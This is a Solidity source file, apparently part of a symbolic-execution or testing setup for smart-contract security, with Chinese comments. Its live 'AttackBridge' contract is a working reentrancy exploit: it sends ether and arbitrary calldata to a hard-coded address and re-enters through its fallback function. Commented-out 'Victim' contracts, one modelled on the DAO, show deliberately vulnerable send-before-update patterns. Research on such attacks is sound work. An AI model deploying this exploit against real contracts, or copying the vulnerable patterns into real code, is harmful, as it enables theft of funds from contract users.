// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AttackBridge{

    // address private last_caller_addr;
    // string private func_sig;
    bytes private free_call_data;
    // bytes  private call_data;
    // string private func_sig_re;
    // address private owner;
    uint256 private flag;
    uint256 private counter;


    constructor(bytes memory func_sig_) public {
        free_call_data = func_sig_;
        flag = 0;
        counter = 1;
        // last_caller_addr = address(0);
        // func_sig_re = func_sig_;
        // owner = msg.sender;
    }

    // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 

    function attack(uint256 num_, bytes memory call_data_1) public payable{
        // 开锁
        flag = 1;
        counter = counter +1;
        if (counter >= 5){
            return;
        }
        // call_data = call_data_1;
        // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
            // abi.encodeWithSignature(func_sig_, call_data_1, call_data_1) );
        free_call_data = call_data_1;
        (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(call_data_1);
        if (!sucess){
            //关锁
            flag = 0;
            revert();
        }
        //关锁
        flag = 0;
    }

    // function attack0(uint256 num_, string memory func_sig_, address addr) public payable{
        
    //     // 开锁
    //     flag = 1;

    //     // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
    //     //     abi.encodeWithSignature(func_sig_) );
    //     func_sig_re = func_sig_;
    //     last_caller_addr = addr;
    //     (bool sucess, bytes memory data) = address(addr).call.value(num_)(
    //         abi.encodeWithSignature(func_sig_) );
    //     // func_sig_re = abi.encodeWithSignature(func_sig_);
        
    //     if (!sucess){
    //         //关锁
    //         flag = 0;
    //         // revert();
    //     }
    //     //关锁
    //     flag = 0;
    // }

    // function call_ (address addr_, string memory sig) private returns (bool){
    //     bool sucess;
    //     bytes memory data;
    //     // bytes1 zero = 0x00;
    //     if (call_data_list.length == 0){
    //         (sucess, data) = address(addr_).call(
    //         abi.encodeWithSignature(sig) );
    //         return sucess;
    //     }
    //     else {
    //         (sucess, data) = address(addr_).call(
    //         // abi.encodeWithSignature(sig, call_data_list) );
    //         abi.encodeWithSignature(sig, call_data_list,call_data_list) );
    //         return sucess;
    //     }
    // }

    // function return_true () internal returns (bool){
    //     return true;
    // }

    function () external payable {
        // init
        // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
        // string memory sig_ = "attacked(uint,address)"; 
        // if (flag != 1){
        //     revert();
        //     // return_true();
        // }
        // (bool sucess, bytes memory data) = address(msg.sender).call(
        // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );

        // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(
        //     abi.encodeWithSignature(func_sig, call_data, call_data) );
        if (flag == 1){
            // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data);
            // (bool sucess, bytes memory data) = address(last_caller_addr).call.value(0)(free_call_data);
            // attack0(0, func_sig_re, last_caller_addr);
            attack(0,free_call_data);
            // if (!sucess){
            //     revert();
            //     // (bool sucess2, bytes memory data2) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data
            //     // if (!sucess2){
            //         // revert();
            //     // }
            // }
        }
    }
}


// contract Victim1{
//     uint256 private num;
//     address private sender;
//     uint256 private value; 

//     function attacked(uint256 a, address b) public returns (bool) {
//         if (address(this).balance < a ){
//             revert();
//         }
//         (bool scuess, bytes memory data) = address(msg.sender).call.value(a)("");
//         if (!scuess){
//             revert();
//         }
//         return true;
//     }
    
//     function() external payable{
//         // return true;
//     }
// }


// contract Victim2{

//     Victim2_support public rewardAccount;
//     uint public closingTime;
//     uint public minTokensToCreate;
//     uint constant creationGracePeriod = 40 days;
//     uint256 public totalSupply;
//     mapping (address => uint) public paidOut;
//     mapping (address => uint) public paid;

//     constructor(uint _closingTime) public {
        
//         rewardAccount = new Victim2_support(address(this));
//         if(address(rewardAccount) == address(0)){
//             revert();
//         }

//         closingTime = _closingTime;
//     }

//     function () external payable {
//         bool a = false;
//         if (block.timestamp < closingTime + creationGracePeriod){
//             a =  createTokenProxy(msg.sender);
//         }
//         if (!a){
//             revert();
//         }
//     }

//     function createTokenProxy(address _tokenHolder) internal returns (bool success) {
//         if (block.timestamp < closingTime 
//             && msg.value > 0
//             ) {
//             totalSupply += msg.value/2;
//             if (totalSupply >= minTokensToCreate) {
//                 (bool sucess, bytes memory data) = address(rewardAccount).call.value(msg.value/2)("");
//             }
//             paid[_tokenHolder]+=totalSupply;
//             return true;
//         }
//         return false;
//     }

//     function withdrawRewardFor() external returns (bool _success) {
//         if (paid[msg.sender] == 0){
//             revert();
//         }
//         uint reward = 1 ether;
//         if (!rewardAccount.payOut(msg.sender, reward))
//             revert();
//         paidOut[msg.sender] += reward;
//         return true;
//     }
// }

// contract Victim2_support{
//     address public owner;
//     uint public accumulatedInput;


//     constructor (address owner_) public {
//         owner = owner_;
//     }

//     function() external payable{
//         accumulatedInput += msg.value;
//     }

//     function payOut(address _recipient, uint _amount) public payable returns (bool){
//         if (msg.sender!= owner || msg.value > 0){
//             revert();
//         }
//         (bool sucess, bytes memory data) = address(_recipient).call.value(_amount)("");
//         return sucess;
//     }

// }


// // contract Victim2{
// //     uint256 private num;
// //     address private sender;
// //     uint256 private value; 
    
// //     constructor(uint256  func_sig_, uint256  func_sig_2) public {
// //         num = func_sig_;
// //         sender = address(0);
// //         // last_caller_addr = address(0);
// //         // func_sig_re = func_sig_;
// //         // owner = msg.sender;
// //     }

// //     function attacked(uint256 a, bool b) public returns (bool) {
// //         if (address(this).balance < a ){
// //             revert();
// //         }
// //         (bool scuess, bytes memory data) = address(msg.sender).call.value(a)("");
// //         if (!scuess){
// //             revert();
// //         }
// //         return true;
// //     }
    
// //     function() external payable{
// //         // return true;
// //     }
// // }

// // contract AttackBridge2{

// //     // address private last_caller_addr;
// //     // string private func_sig;
// //     bytes private free_call_data;
// //     // bytes  private call_data;
// //     // string private func_sig_re;
// //     // address private owner;
// //     uint256 private flag;


// //     constructor(bytes memory func_sig_, bytes memory func_sig_2) public {
// //         free_call_data = func_sig_;
// //         flag = 0;
// //         // last_caller_addr = address(0);
// //         // func_sig_re = func_sig_;
// //         // owner = msg.sender;
// //     }

// //     // 满足 call 的 地址是符号型的, sig 是符号型的 value 也是符号型的. 

// //     function attack(uint256 num_, bytes memory call_data_1) public payable{
// //         // 开锁
// //         flag = 1;
// //         // call_data = call_data_1;
// //         // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
// //             // abi.encodeWithSignature(func_sig_, call_data_1, call_data_1) );
// //         (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(call_data_1);
// //         if (!sucess){
// //             //关锁
// //             flag = 0;
// //             revert();
// //         }
// //         //关锁
// //         flag = 0;
// //     }

// //     function attack2(uint256 num_, bytes memory call_data_1, bytes memory call_data_2) public payable{
// //         // 开锁
// //         flag = 1;
// //         // call_data = call_data_1;
// //         // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
// //             // abi.encodeWithSignature(func_sig_, call_data_1, call_data_1) );
// //         (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(call_data_1);
// //         if (!sucess){
// //             //关锁
// //             flag = 0;
// //             revert();
// //         }
// //         //关锁
// //         flag = 0;
// //     }    

// //     // function attack0(uint256 num_, bytes4 func_sig_) public payable{
        
// //     //     // 开锁
// //     //     flag = 1;

// //     //     (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call.value(num_)(
// //     //         abi.encodeWithSignature(func_sig_) );
// //     //     if (!sucess){
// //     //         //关锁
// //     //         flag = 0;
// //     //         revert();
// //     //     }
// //     //     //关锁
// //     //     flag = 0;
// //     // }

// //     // function call_ (address addr_, string memory sig) private returns (bool){
// //     //     bool sucess;
// //     //     bytes memory data;
// //     //     // bytes1 zero = 0x00;
// //     //     if (call_data_list.length == 0){
// //     //         (sucess, data) = address(addr_).call(
// //     //         abi.encodeWithSignature(sig) );
// //     //         return sucess;
// //     //     }
// //     //     else {
// //     //         (sucess, data) = address(addr_).call(
// //     //         // abi.encodeWithSignature(sig, call_data_list) );
// //     //         abi.encodeWithSignature(sig, call_data_list,call_data_list) );
// //     //         return sucess;
// //     //     }
// //     // }

// //     // function return_true () internal returns (bool){
// //     //     return true;
// //     // }

// //     function () external payable {
// //         // init
// //         // 咱们做 符号执行的时候 不用 sig_, 只是目前实际测试的时候采用 sig_; 
// //         // string memory sig_ = "attacked(uint,address)"; 
// //         if (flag != 1){
// //             revert();
// //             // return_true();
// //         }
// //         // (bool sucess, bytes memory data) = address(msg.sender).call(
// //         // abi.encodeWithSignature(func_sig, call_data1, call_data2, call_data3, call_data4, call_data5) );

// //         // (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(
// //         //     abi.encodeWithSignature(func_sig, call_data, call_data) );
// //         (bool sucess, bytes memory data) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data);
// //         if (!sucess){
// //             revert();
// //             // (bool sucess2, bytes memory data2) = address(0x0901d12ebE1b195E5AA8748E62Bd7734aE19B51F).call(free_call_data
// //             // if (!sucess2){
// //                 // revert();
// //             // }
// //         }
// //         // return_true();
// //     }
// // }